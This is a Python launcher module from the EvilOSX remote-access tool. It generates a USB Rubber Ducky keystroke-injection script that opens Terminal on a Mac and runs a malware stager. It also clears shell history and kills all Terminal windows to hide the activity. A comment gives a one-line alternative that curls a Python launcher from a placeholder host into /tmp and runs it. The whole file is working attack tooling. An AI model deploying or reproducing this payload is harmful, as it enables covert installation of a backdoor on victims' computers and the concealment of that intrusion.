from launchers.helpers import LauncherABC


class Launcher(LauncherABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Creates a rubber ducky launcher.",
            "References": [],
        }

    def generate(self, stager: str):
        return ("txt", """\
        REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
        REM Also see https://ducktoolkit.com/vidpid/
        REM If timing is important, the following is a lot faster:
        REM STRING cd /tmp; curl -s HOST_TO_PYTHON_LAUNCHER.py -o 1337.py; python 1337.py; history -cw; clear

        DELAY 1000
        GUI SPACE
        DELAY 500
        STRING Termina
        DELAY 1000
        ENTER
        DELAY 1500

        REM Kill all terminals after x seconds
        STRING screen -dm bash -c 'sleep 6; killall Terminal'
        ENTER

        REM Run the stager
        STRING {}; history -cw; clear
        ENTER
        """.format(stager))
